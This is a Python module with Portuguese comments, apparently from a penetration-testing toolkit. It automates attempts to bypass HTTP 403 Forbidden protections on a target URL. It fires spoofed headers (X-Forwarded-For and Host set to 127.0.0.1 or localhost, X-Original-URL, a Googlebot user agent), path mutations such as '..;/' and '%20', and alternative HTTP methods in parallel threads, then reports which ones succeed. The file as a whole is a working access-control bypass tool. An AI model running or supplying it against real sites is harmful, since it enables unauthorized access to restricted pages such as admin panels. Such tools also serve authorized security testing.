#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger("nsf.bypass_403")

# User-Agent para requisições
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Técnicas de bypass para status 403
BYPASS_TECHNIQUES = {
    'headers': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Forwarded-Host': '127.0.0.1'},
        {'X-Host': '127.0.0.1'},
        {'X-Original-URL': '/'},
        {'X-Rewrite-URL': '/'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Remote-Addr': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Host': 'localhost'},
        {'Host': 'localhost'},
        {'Host': '127.0.0.1'},
        {'Referer': 'https://google.com'},
        {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'},
        {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
        {'Cache-Control': 'no-transform'},
        {'Content-Length': '0'},
        {'Via': '1.1 localhost'},
        {'Upgrade-Insecure-Requests': '1'},
        {'Proxy': '127.0.0.1'},
        {'Connection': 'keep-alive'},
        {'X-Requested-With': 'XMLHttpRequest'},
        {'X-ProxyUser-Ip': '127.0.0.1'}
    ],
    'paths': [
        '{path}/',
        '{path}/.',
        '{path}?',
        '{path}??',
        '{path}?something',
        '{path}#',
        '{path}%20',
        '{path}%09',
        '{path}.html',
        '{path}.php',
        '{path}.json',
        '{path}..;/',
        './/{path}'
    ],
    'methods': [
        'POST',
        'PUT',
        'DELETE',
        'PATCH',
        'OPTIONS',
        'TRACE',
        'PROPFIND',
        'DEBUG'
    ]
}

def bypass_403(target, techniques=None):
    """
    Tenta bypass de páginas com status 403 Forbidden.
    
    Args:
        target (str): URL alvo (ex: https://exemplo.com/admin)
        techniques (list): Lista de técnicas a testar ('headers', 'paths', 'methods')
                           Se None, todas serão testadas
    
    Returns:
        dict: Resultado das tentativas de bypass
    """
    logger.info(f"Iniciando bypass 403 em {target}")
    
    # Normalizar URL alvo
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Headers base para requisições
    base_headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    # Se nenhuma técnica específica for fornecida, usar todas
    if not techniques:
        techniques = ['headers', 'paths', 'methods']
    
    # Verificar resposta original
    try:
        original_response = requests.get(target, headers=base_headers, timeout=10)
        original_status = original_response.status_code
        
        # Se a página não retornar 403, avisar mas continuar
        if original_status != 403:
            logger.warning(f"A página alvo retornou status {original_status}, não 403 Forbidden. Continuando mesmo assim.")
    except Exception as e:
        logger.error(f"Erro ao acessar a página alvo: {str(e)}")
        original_status = 0
    
    # Resultados
    successful_techniques = []
    all_results = []
    
    # Extrair caminho da URL para modificações
    parsed_url = urlparse(target)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    original_path = parsed_url.path
    
    # Função para testar uma técnica específica
    def test_technique(technique_type, technique_value):
        try:
            # Aplicar a técnica conforme o tipo
            if technique_type == 'headers':
                # Adicionar o header personalizado aos headers base
                headers = base_headers.copy()
                for header, value in technique_value.items():
                    headers[header] = value
                
                response = requests.get(target, headers=headers, timeout=10)
                technique_name = f"Header: {list(technique_value.keys())[0]}"
                method = 'GET'
                url = target
            
            elif technique_type == 'paths':
                 # Modificar o caminho da URL
                modified_path = technique_value.format(path=original_path.rstrip('/'))
                modified_url = urljoin(base_url, modified_path)
                
                response = requests.get(modified_url, headers=base_headers, timeout=10)
                technique_name = f"Path: {modified_path}"
                method = 'GET'
                url = modified_url
            
            elif technique_type == 'methods':
                # Usar métodos HTTP alternativos
                method = technique_value
                response = requests.request(method, target, headers=base_headers, timeout=10)
                technique_name = f"Method: {method}"
                url = target
            
            # Verificar se o bypass funcionou
            if response.status_code != 403 and response.status_code < 400:
                logger.info(f"Bypass bem-sucedido! Técnica: {technique_name}, Status: {response.status_code}")
                return {
                    'success': True,
                    'name': technique_name,
                    'url': url,
                    'method': method,
                    'status': response.status_code,
                    'content_type': response.headers.get('Content-Type', 'unknown'),
                    'content_length': len(response.content)
                }
            
            # Guardar o resultado mesmo que não tenha sido bem-sucedido
            return {
                'success': False,
                'name': technique_name,
                'url': url,
                'method': method,
                'status': response.status_code
            }
        
        except Exception as e:
            logger.debug(f"Erro ao testar técnica {technique_type}: {str(e)}")
            return None
    
    # Testar técnicas com múltiplas threads
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        
        # Para cada categoria de técnica selecionada
        for technique_type in techniques:
            if technique_type in BYPASS_TECHNIQUES:
                for technique_value in BYPASS_TECHNIQUES[technique_type]:
                    futures.append(executor.submit(test_technique, technique_type, technique_value))
        
        # Processar resultados à medida que forem concluídos
        for future in as_completed(futures):
            result = future.result()
            if result:
                all_results.append(result)
                if result['success']:
                    successful_techniques.append(result)
    
    # Ordenar resultados bem-sucedidos pelo status
    successful_techniques.sort(key=lambda x: x['status'])
    
    return {
        'successful_techniques': successful_techniques,
        'all_results': all_results,
        'total_attempts': len(all_results),
        'successful_count': len(successful_techniques),
        'original_status': original_status,
        'target': target
    }